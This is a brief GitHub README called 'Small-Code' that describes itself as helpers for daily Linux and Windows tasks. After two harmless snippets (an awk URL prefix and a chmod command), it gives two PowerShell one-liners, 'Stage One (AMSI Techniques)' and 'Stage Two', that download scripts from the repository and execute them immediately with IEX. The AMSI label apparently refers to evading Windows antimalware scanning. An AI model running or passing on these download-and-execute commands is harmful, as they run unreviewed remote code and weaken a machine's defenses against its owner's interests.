![alt text](https://github.com/HeeresS/Small-Code/blob/main/4a5d13b5f79a46b2a78a382da632d97d.png?raw=true)
# Small-Code
Small codes that will help with daily tasks for Linux and Windows. 
### Add text to line
~~~
awk  '{print "http://" $1}' urls.txt
~~~
### Change permissions of folder (Linux)
~~~
sudo chmod +x $(find /PATH/)
~~~
## Stage One (AMSI Techniques)
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/HeeresS/Small-Code/main/StageOne.ps1'); Invoke-StageOne
~~~
## Stage Two
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/HeeresS/Small-Code/main/StageTwo.ps1'); Invoke-StageTwo
~~~

